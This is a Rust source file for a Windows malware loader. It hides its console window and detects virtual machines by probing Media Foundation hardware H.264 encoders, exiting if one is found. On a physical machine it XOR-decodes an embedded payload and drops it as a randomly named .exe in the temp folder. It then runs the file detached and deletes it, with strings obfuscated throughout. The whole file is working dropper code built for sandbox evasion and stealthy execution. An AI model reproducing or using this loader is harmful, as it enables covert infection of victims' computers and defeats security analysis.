#![windows_subsystem = "windows"]

mod chunks;

use windows::core::{Result, PCWSTR};
use windows::Win32::Media::MediaFoundation::*;
use windows::Win32::System::Com::*;
// use windows::Win32::System::Threading::*;
// use windows::Win32::Foundation::*;
// use rand::{Rng, SeedableRng};
// use rand_chacha::ChaCha8Rng;
use std::fs;
use std::io::Write;

fn main() -> Result<()> {
    unsafe {
        // VM Detection - Exit if virtual environment detected
        if !check_hardware_authenticity() {
            std::process::exit(1);
        }
        
        // Proceed with payload loading only on physical machine
        let payload = reassemble_with_seed(chunks::SEED);
        
        if payload.len() < 64 {
            return Err(windows::core::Error::from_win32());
        }
        
        execute_payload(&payload)
    }
}

unsafe fn check_hardware_authenticity() -> bool {
    let mut is_physical = true;

    // Initialize COM and Media Foundation
    if CoInitializeEx(None, COINIT_MULTITHREADED).is_err() {
        return false;
    }
    
    if MFStartup(MF_VERSION, MFSTARTUP_FULL).is_err() {
        CoUninitialize();
        return false;
    }

    // Level 1: Check for hardware encoders
    match check_hw_encoders() {
        Ok(count) => {
            if count == 0 {
                is_physical = false;
            }
        }
        Err(_) => {
            is_physical = false;
        }
    }

    // Level 2: Test functional pipeline
    if is_physical {
        let mut attributes: Option<IMFAttributes> = None;
        if MFCreateAttributes(&mut attributes, 1).is_ok() {
            if let Some(attributes) = attributes {
                let _ = attributes.SetUINT32(&MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, 1);

                let temp_path = obfstr::obfstr!("C:\\Windows\\Temp\\hw_probe.mp4").to_string();
                // Alternative path if C:\Windows\Temp is not accessible
                let alt_path = std::env::temp_dir().join(obfstr::obfstr!("hw_probe.mp4").to_string());
                let path_to_use = if fs::write(&temp_path, b"").is_ok() {
                    let _ = fs::remove_file(&temp_path);
                    temp_path
                } else {
                    alt_path.to_string_lossy().to_string()
                };
                
                let output_path: Vec<u16> = path_to_use.encode_utf16().chain(Some(0)).collect();
                
                match MFCreateSinkWriterFromURL(PCWSTR(output_path.as_ptr()), None, &attributes) {
                    Ok(writer) => {
                        let mut pipeline_ok = false;
                        if let Ok(mt) = create_h264_type() {
                            if let Ok(idx) = writer.AddStream(&mt) {
                                if let Ok(in_mt) = create_input_type() {
                                    let _ = writer.SetInputMediaType(idx, &in_mt, None);
                                    if writer.BeginWriting().is_ok() {
                                        pipeline_ok = true;
                                    }
                                }
                            }
                        }
                        
                        let _ = writer.Finalize();
                        let _ = std::fs::remove_file(&path_to_use);
                        
                        if !pipeline_ok { is_physical = false; }
                    }
                    Err(_) => {
                        is_physical = false;
                    }
                }
            }
        }
    }

    let _ = MFShutdown();
    CoUninitialize();

    is_physical
}

unsafe fn check_hw_encoders() -> Result<u32> {
    let mut count: u32 = 0;
    let mut activates: *mut Option<IMFActivate> = std::ptr::null_mut();
    
    let output_info = MFT_REGISTER_TYPE_INFO {
        guidMajorType: MFMediaType_Video,
        guidSubtype: MFVideoFormat_H264,
    };

    let res = MFTEnumEx(
        MFT_CATEGORY_VIDEO_ENCODER,
        MFT_ENUM_FLAG_HARDWARE,
        None,
        Some(&output_info),
        &mut activates,
        &mut count,
    );

    if res.is_ok() && !activates.is_null() {
        let slice = std::slice::from_raw_parts(activates, count as usize);
        for act in slice {
            if let Some(a) = act {
                drop(a);
            }
        }
        CoTaskMemFree(Some(activates as *const _));
    }

    res.map(|_| count)
}

unsafe fn create_h264_type() -> Result<IMFMediaType> {
    let mt = MFCreateMediaType()?;
    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_H264)?;
    mt.SetUINT32(&MF_MT_AVG_BITRATE, 4_000_000)?;
    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280 as u64) << 32) | 720)?;
    mt.SetUINT64(&MF_MT_FRAME_RATE, ((30 as u64) << 32) | 1)?;
    mt.SetUINT32(&MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive.0 as u32)?;
    Ok(mt)
}

unsafe fn create_input_type() -> Result<IMFMediaType> {
    let mt = MFCreateMediaType()?;
    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280 as u64) << 32) | 720)?;
    Ok(mt)
}

unsafe fn reassemble_with_seed(_seed: u64) -> Vec<u8> {
    // let mut rng = ChaCha8Rng::seed_from_u64(seed); // Unused
    let mut raw = Vec::with_capacity(chunks::ORIGINAL_SIZE);
    
    let mut pool_cursor = 0;
    let mut produced_bytes = 0;
    
    while produced_bytes < chunks::ORIGINAL_SIZE {
        // Calculate size of next real data chunk
        let remaining = chunks::ORIGINAL_SIZE - produced_bytes;
        let chunk_size = remaining.min(chunks::CHUNK_SIZE);
        
        // Extract and decrypt chunk
        for i in 0..chunk_size {
            if pool_cursor + i < chunks::DATA_POOL.len() {
                raw.push(chunks::DATA_POOL[pool_cursor + i] ^ 0x55);
            }
        }
        
        pool_cursor += chunk_size;
        produced_bytes += chunk_size;
    }
    
    raw
}

unsafe fn execute_payload(data: &[u8]) -> Result<()> {
    let temp_dir = std::env::temp_dir();
    let random_name: String = (0..8)
        .map(|_| {
            let idx = rand::random::<usize>() % 36;
            obfstr::obfstr!("abcdefghijklmnopqrstuvwxyz0123456789").chars().nth(idx).unwrap()
        })
        .collect();
    
    let temp_path = temp_dir.join(format!("{}.exe", random_name));
    
    let mut file = fs::File::create(&temp_path).map_err(|_| {
        windows::core::Error::from_win32()
    })?;
    
    file.write_all(data).map_err(|_| {
        windows::core::Error::from_win32()
    })?;
    
    drop(file);
    
    match std::process::Command::new(&temp_path).spawn() {
        Ok(child) => {
            // Detach the process - just let it run
            std::mem::forget(child);
            
            // Wait a bit for process to start
            std::thread::sleep(std::time::Duration::from_millis(500));
            
            // Try to delete the temp file (may fail if still in use, that's ok)
            let _ = fs::remove_file(&temp_path);
            
            Ok(())
        }
        Err(_) => {
            let _ = fs::remove_file(&temp_path);
            Err(windows::core::Error::from_win32())
        }
    }
}
